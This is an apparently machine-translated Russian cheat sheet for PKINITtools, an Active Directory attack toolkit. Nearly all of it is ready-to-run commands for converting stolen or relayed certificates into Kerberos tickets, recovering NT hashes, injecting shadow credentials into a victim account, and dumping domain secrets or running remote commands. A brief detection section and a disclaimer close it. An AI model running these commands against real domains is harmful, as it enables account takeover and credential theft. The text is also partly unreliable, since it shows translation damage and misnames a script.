<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🎫 PKINITtools — Полная шпаргалка

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██████╗ ██╗  ██╗██╗███╗   ██╗██╗████████╗████████╗ ██████╗  ██████╗ ██╗     ███████╗
  ██╔══██╗██║ ██╔╝██║████╗  ██║██║╚══██╔══╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
  ██████╔╝█████╔╝ ██║██╔██╗ ██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ███████╗
  ██╔═══╝ ██╔═██╗ ██║██║╚██╗██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ╚════██║
  ██║     ██║  ██╗██║██║ ╚████║██║   ██║      ██║   ╚██████╔╝╚██████╔╝███████╗███████║
  ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
       Kerberos PKINIT Authentication, Shadow Credentials & UnPAC-the-Hash Toolkit
```
<p выравнивание="центр">
  <img src="https://img.shields.io/badge/PKINITtools-Kerberos_PKINIT-blue?style=for-the-badge" alt="PKINITtools">
  <img src="https://img.shields.io/badge/Author-Dirk--jan_Mollema-orange?style=for-the-badge" alt="dirkjanm">
  <img src="https://img.shields.io/badge/Category-Active_Directory_&_Network-green?style=for-the-badge" alt="Active Directory">
  <img src="https://img.shields.io/badge/License-MIT-red?style=for-the-badge" alt="Лицензия MIT">
</p>

<p выравнивание="центр">
  <b>🌐 Инструменты для шифрования с открытым ключом Kerberos для начальной аутентификации (PKINIT), преобразования сертификатов в билеты TGT и восстановления NT-хэшей</b>
</p>

---

## 📋 Содержание

- [Обзор и архитектура PKINIT](#-overview--pkinit-architecture)
- [Ключевые утилиты: `gettgtpkinit.py` и `getskeyhash.py`](#-key-utilities-gettgtpkinitpy --getskeyhashpy)
- [Установка](#-установка)
- [Преобразование сертификатов AD CS в Kerberos TGT](#-converting-ad-cs-certificates-to-kerberos-tgt)
  - [Использование файла PFX](#using-a-pfx-file)
  - [Использование PFX в кодировке Base64 (релейные цепочки)](#using-base64-encoded-pfx-relay-chains)
- [Восстановление NT-хешей (UnPAC-the-Hash)](#-recovering-nt-hashes-unpac-the-hash)
- [Рабочий процесс атаки на теневые учетные данные] (#-shadow-credentials-attack-workflow)
- [Использование TGT с помощью Impacket и NetExec](#-потребление-tgt-with-impacket--netexec)
- [Краткая справочная таблица](#-краткая справочная-таблица)
- [Защитные соображения и обнаружение](#-защитные-соображения--обнаружение)
- [Юридическая оговорка](#-юридическая оговорка)

---

## 🎯 Обзор и архитектура PKINIT

**PKINIT** (криптография с открытым ключом для начальной аутентификации в Kerberos, определенная в **RFC 4556**) — это расширение протокола Kerberos. Вместо того, чтобы требовать хеш секретного пароля пользователя (NTLM или AES) для запроса билета предоставления билета Kerberos (TGT), PKINIT позволяет клиенту подтверждать личность с помощью **цифровых сертификатов X.509 и пар частного/открытого ключей**.

Созданный известным исследователем Active Directory **Дирком-Яном Моллемой (@_dirkjan)**, **PKINITtools** предоставляет основные примитивы Python для:
1. Аутентификация на контроллерах домена Active Directory через PKINIT с использованием извлеченных или ретранслируемых цифровых сертификатов.
2. Получите стандартный файл Kerberos TGT (`.ccache`).
3. Восстановите открытый текст **NTLM Hash** учетной записи с помощью механизма **UnPAC-the-Hash**.

---

## 🧰 Ключевые утилиты: `gettgtpkinit.py` и `getskeyhash.py`

- **`gettgtpkinit.py`**: связывается с KDC (центром распространения ключей Kerberos) через порт 88, представляет сертификат и запрашивает бронированный TGT, сохраняя его в виде файла Kirbi или ccache.
- **`getskeyhash.py`**: запрашивает Kerberos PAC (сертификат атрибута привилегий), возвращенный в билете PKINIT, для расчета и предоставления статического NT-хеша учетной записи.

---

## 📥 Установка
```bash
# Clone GitHub repository
git clone https://github.com/dirkjanm/PKINITtools.git
cd PKINITtools

# Install dependencies (requires impacket, cryptography, minikerberos)
pip3 install -r requirements.txt
pip3 install .
```
---

## 🎫 Преобразование сертификатов AD CS в Kerberos TGT

При получении сертификата Active Directory через Certipy, Coercer или NTLM Relay:

### Использование файла PFX
```bash
# Request TGT using a client certificate file (.pfx)
gettgtpkinit.py -cert-pfx administrator.pfx -pfx-pass 'CertPass123' corp.local/administrator admin.ccache
```
### Использование PFX в кодировке Base64 (релейные цепочки)

Часто `ntlmrelayx` печатает сертификаты как необработанную строку base64 во время атак AD CS ESC8:
```bash
# Convert base64 certificate directly into a Kerberos TGT for Domain Controller (DC01$)
gettgtpkinit.py -pfx-base64 "MIIKggIBAzCCCXwGCSqGSIb3DQEHA..." corp.local/DC01\$ dc01.ccache
```
---

## 🔑 Восстановление NT-хешей (UnPAC-the-Hash)

Когда учетная запись проходит проверку подлинности с помощью PKINIT, контроллер домена подписывает PAC с помощью структуры PAC_CREDENTIAL_INFO, содержащей статический **NTLM-хеш** учетной записи (зашифрованный временным ключом AS-REP). `getskeyhash.py` расшифровывает эту структуру:
```bash
# Extract the NTLM hash directly from the ticket and KDC
getskeyhash.py -hashes :7fc508... corp.local/administrator admin.ccache

# Output format:
# [*] Found PAC DATA
# [*] Decrypted PAC_CREDENTIAL_INFO
# [!] Recovered NT Hash: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```
Имея под рукой NT-хеш, вы можете немедленно выполнить **Pass-the-Hash** или автономный взлом!

---

## 👥 Рабочий процесс атаки с использованием теневых учетных данных

Если у вас есть доступ на запись к объекту Active Directory (`GenericAll`, `GenericWrite`, `WriteProperty` через `msDS-KeyCredentialLink`):
```bash
# 1. Use pyWhisker to inject a newly generated key credential into the victim object
pywhisker.py -d "corp.local" -u "lowuser" -p "Password123" --target "TargetUser" --action "add" --export "targetuser.pfx"

# 2. Use PKINITtools to authenticate with the forged certificate
gettgtpkinit.py -cert-pfx targetuser.pfx -pfx-pass "pywhisker" corp.local/TargetUser target.ccache

# 3. Extract TargetUser's NT Hash
getskeyhash.py corp.local/TargetUser target.ccache
```
---

## 🚀 Использование TGT с помощью Impacket и NetExec

Как только `gettgtpkinit.py` выведет билет `.ccache`, экспортируйте его в среду:
```bash
# Set Kerberos credential cache environment variable
export KRB5CCNAME=/path/to/admin.ccache

# Dump domain secrets via Impacket without passwords!
impacket-secretsdump -k -no-pass corp.local/administrator@dc01.corp.local

# Connect via Evil-WinRM using Kerberos ticket
evil-winrm -i dc01.corp.local -r corp.local

# Execute commands using NetExec with Kerberos auth
nxc smb dc01.corp.local -k --no-pass -x "whoami /priv"
```
---

## ⚡ Краткая справочная таблица

| Цель | Команда |
|-----------|---------|
| **TGT через файл PFX** | `gettgtpkinit.py -cert-pfx <FILE.pfx> <DOMAIN>/<USER> <OUT.ccache>` |
| **TGT через сертификат Base64** | `gettgtpkinit.py -pfx-base64 "<BASE64>" <DOMAIN>/<USER> <OUT.ccache>` |
| **Укажите контроллер домена**| `gettgtpkinit.py -dc-ip <DC_IP> -cert-pfx <CERT> <DOMAIN>/<USER> <TGT>` |
| **UnPAC-the-Hash (получить NTLM)**| `getskeyhash.py <DOMAIN>/<USER> <TGT.ccache>` |
| **Передать TGT в Impacket** | `export KRB5CCNAME=<TGT.ccache>; impacket-secretsdump -k -no-pass <DOMAIN>/<USER>@<DC>` |
| **Передать TGT в NetExec** | `export KRB5CCNAME=<TGT.ccache>; nxc smb <DC> -k --no-pass` |

---

## 🛡️ Соображения по защите и обнаружению

1. **Идентификатор события 4768 (запрос TGT):** Active Directory регистрирует запросы TGT Kerberos. При использовании PKINIT в поле **Тип предварительной аутентификации** отображается `16` (PKINIT), а не `2` (PA-ENC-TIMESTAMP).
2. **Аудит изменений `msDS-KeyCredentialLink`:** Событие с кодом 5136 записывает изменения объектов каталога. Оповещение, когда ключевые учетные данные добавляются к управляемым учетным записям, не принадлежащим Azure/Intune.

---

## ⚠️ Юридическая оговорка

> [!ВНИМАНИЕ]
> PKINITtools предназначен только для авторизованного аудита безопасности Active Directory, операций Red Team и образовательных исследований. Манипулирование корпоративными билетами Kerberos без явного разрешения является незаконным.